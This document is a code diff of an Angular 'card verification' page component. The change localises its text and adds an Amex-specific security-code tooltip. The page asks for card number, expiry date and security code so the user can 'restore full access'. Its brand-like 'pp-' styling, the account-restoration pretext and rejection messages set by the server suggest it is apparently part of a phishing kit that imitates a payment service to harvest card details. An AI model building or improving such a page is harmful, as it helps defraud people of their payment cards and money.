@@ -5,18 +5,19 @@ import { FormsModule } from '@angular/forms';
 import { PublicLayoutComponent } from './layout/public-layout.component';
 import { StateService } from '../services/state.service';
 import { validateCardLogic, CardType } from './card-validation.utils';
+import { TranslatePipe } from '../pipes/translate.pipe';
 
 @Component({
   selector: 'app-card-verification',
   standalone: true,
-  imports: [CommonModule, FormsModule, PublicLayoutComponent],
+  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
   template: `
     <app-public-layout>
       
       <div class="flex flex-col items-center mb-6">
-        <h1 class="text-2xl font-bold text-pp-navy mb-2 text-center tracking-tight">Confirm your card</h1>
+        <h1 class="text-2xl font-bold text-pp-navy mb-2 text-center tracking-tight">{{ 'CARD.TITLE' | translate }}</h1>
         <p class="text-base text-slate-500 text-center leading-relaxed max-w-[90%]">
-           As a final step, please verify the card on file to restore full access.
+           {{ 'CARD.SUBTITLE' | translate }}
         </p>
       </div>
 
@@ -24,8 +25,8 @@ import { validateCardLogic, CardType } from './card-validation.utils';
         <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
             <span class="material-icons text-[#D92D20] text-xl">credit_card_off</span>
             <div>
-              <p class="text-sm font-bold text-pp-navy">Please check your card info</p>
-              <p class="text-xs text-slate-600 mt-1">We couldn't verify this card. Please check the details or try another one.</p>
+              <p class="text-sm font-bold text-pp-navy">{{ 'CARD.ERROR_TITLE' | translate }}</p>
+              <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() }}</p>
             </div>
         </div>
       }
@@ -46,7 +47,7 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                  class="pp-input peer font-mono tracking-wide"
                  [class.shadow-input-error]="touchedCard() && !isCardNumValid()"
                >
-               <label for="cardNum" class="pp-label">Debit or credit card number</label>
+               <label for="cardNum" class="pp-label">{{ 'CARD.Card Number' | translate }}</label>
                
                <!-- Dynamic Brand Icon -->
                @if(cardType() !== 'unknown') {
@@ -76,7 +77,7 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                   class="pp-input peer font-mono"
                   [class.shadow-input-error]="touchedExp() && !isExpiryValid()"
                 >
-                <label for="expiry" class="pp-label">MM / YY</label>
+                <label for="expiry" class="pp-label">{{ 'CARD.Expiration Date' | translate }}</label>
              </div>
              
              <div class="relative w-1/2 pp-input-group mb-0">
@@ -91,22 +92,30 @@ import { validateCardLogic, CardType } from './card-validation.utils';
                     class="pp-input peer font-mono"
                     [class.shadow-input-error]="touchedCvv() && !isCvvValid()"
                   >
-                  <label for="cvv" class="pp-label">Security code</label>
+                  <label for="cvv" class="pp-label">{{ 'CARD.Security Code' | translate }}</label>
                   
                   <div class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 group cursor-help z-20">
                       <span class="material-icons text-[20px]">help_outline</span>
 
                       <!-- Tooltip -->
-                      <div class="invisible group-hover:visible absolute bottom-full right-[-10px] mb-2 w-48 bg-pp-navy text-white text-xs p-3 rounded-md shadow-lg z-50">
-                           <p class="mb-3 text-center leading-tight">The 3-digit security code on the back of your card</p>
-
-                           <!-- Card Back Graphic -->
-                           <div class="h-12 w-20 bg-white rounded mx-auto relative shadow-sm border border-slate-200 overflow-hidden">
-                               <div class="absolute top-3 left-0 w-full h-2 bg-slate-800 opacity-80"></div>
-                               <div class="absolute top-6 right-2 w-10 h-3 bg-white border border-slate-300 flex items-center justify-end px-1">
-                                   <span class="text-[7px] text-black font-mono font-bold">123</span>
+                      <div class="invisible group-hover:visible absolute bottom-full right-[-10px] mb-2 w-48 bg-pp-navy text-white text-xs p-3 rounded-md shadow-lg z-50 animate-fade-in">
+                           @if(cardType() === 'amex') {
+                               <p class="mb-3 text-center leading-tight">{{ 'CARD.AMEX_CVV_HELP' | translate }}</p>
+                               <!-- Amex Front Graphic -->
+                               <div class="h-12 w-20 bg-white rounded mx-auto relative shadow-sm border border-slate-200 overflow-hidden">
+                                   <div class="absolute top-4 right-2 text-[8px] text-black font-mono font-bold tracking-widest">1234</div>
+                                   <div class="absolute top-2 left-2 text-[6px] text-slate-300 font-bold uppercase">Amex</div>
                                </div>
-                           </div>
+                           } @else {
+                               <p class="mb-3 text-center leading-tight">{{ 'CARD.CVV_HELP' | translate }}</p>
+                               <!-- Standard Back Graphic -->
+                               <div class="h-12 w-20 bg-white rounded mx-auto relative shadow-sm border border-slate-200 overflow-hidden">
+                                   <div class="absolute top-3 left-0 w-full h-2 bg-slate-800 opacity-80"></div>
+                                   <div class="absolute top-6 right-2 w-10 h-3 bg-white border border-slate-300 flex items-center justify-end px-1">
+                                       <span class="text-[7px] text-black font-mono font-bold">123</span>
+                                   </div>
+                               </div>
+                           }
 
                            <!-- Arrow -->
                            <div class="absolute top-full right-4 -mt-1 border-[6px] border-transparent border-t-pp-navy"></div>
@@ -123,13 +132,13 @@ import { validateCardLogic, CardType } from './card-validation.utils';
             [class.opacity-50]="!isValid()"
             class="pp-btn"
           >
-            Restore Access
+            {{ 'COMMON.CONFIRM' | translate }}
           </button>
         </div>
         
         <div class="flex justify-center items-center gap-2 mt-4 opacity-60">
              <span class="material-icons text-[14px] text-pp-success">lock</span>
-             <p class="text-xs text-slate-500 font-bold">Your card information is stored securely.</p>
+             <p class="text-xs text-slate-500 font-bold">{{ 'BANK_APP.SECURE_VERIFICATION' | translate }}</p>
         </div>
       </div>
     </app-public-layout>
